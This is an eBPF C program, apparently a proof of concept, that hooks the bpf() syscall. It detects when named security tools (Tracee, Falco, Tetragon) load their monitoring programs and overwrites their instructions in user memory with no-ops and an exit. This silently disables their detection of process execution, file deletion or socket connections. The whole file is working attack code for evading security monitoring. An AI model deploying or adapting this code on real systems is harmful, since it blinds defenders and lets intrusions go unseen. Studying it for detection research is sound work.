// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "bpfhijack.h"

/*
#define TARGET_BPF_INSNS 15691		// tetragon: process_exec events
#define TARGET_BPF_INSNS 495 		// falco: execve_x
#define TARGET_BPF_INSNS 2688		// tracee: security_inode_unlink
*/
#define TARGET_BPF_INSNS 1483		// tracee: security_socket_connect

#define BPF_ALU64 0x07
#define BPF_EXIT 0x95

#ifndef BPF_MOV
#define BPF_MOV 0xb0
#endif

#ifndef BPF_K
#define BPF_K 0x00
#endif

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

SEC("tp/syscalls/sys_enter_bpf")
int handle_bpf_enter(struct trace_event_raw_sys_enter *ctx)
{
	int cmd = ctx->args[0];
	size_t insns_cnt = 0;

	if (cmd == BPF_PROG_LOAD) {
		/* See how many bpf instructions userspace intended to load */
		union bpf_attr uattr;
		bpf_probe_read_user(&uattr, sizeof(union bpf_attr), (void *)ctx->args[1]);
		bpf_printk("[hax] detected BPF_PROG_LOAD with # insns=%u", uattr.insn_cnt);
		
		struct bpf_insn insn;

		u32 insn_cnt = uattr.insn_cnt;

		struct event *e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
		if (!e) {
			return 0;
		}
		e->pid = bpf_get_current_pid_tgid() >> 32;
		bpf_get_current_comm(&e->comm, TASK_COMM_LEN);
		e->insn_cnt = insn_cnt;
		bpf_probe_read_str(&e->prog_name, BPF_OBJ_NAME_LEN, uattr.prog_name);

		if (insn_cnt != TARGET_BPF_INSNS) {
			bpf_ringbuf_submit(e, 0);
			return 0;
		}
		bpf_printk("[hax] target program found; # insns=%u", uattr.insn_cnt);

		struct bpf_insn nop_insn = {
                                .code = BPF_ALU64 | BPF_MOV | BPF_K,
                                .dst_reg = BPF_REG_0,
                                .src_reg = BPF_REG_0,
                                .off = 0,
                                .imm = 0
                };

		for (__u32 i = 0; i < TARGET_BPF_INSNS; i++) {
        		if (i == insn_cnt-1) {
            			// Make the last instruction an exit instruction
            			nop_insn.code = BPF_EXIT;
        		}

        		bpf_probe_write_user(&((struct bpf_insn *)uattr.insns)[i], &nop_insn, sizeof(nop_insn));
  		}

		bpf_printk("[hax] replaced %u insns with bpf no-ops", TARGET_BPF_INSNS);
		e->target = e->zeroed = true;
		bpf_ringbuf_submit(e, 0);
	}


	return 0;
}

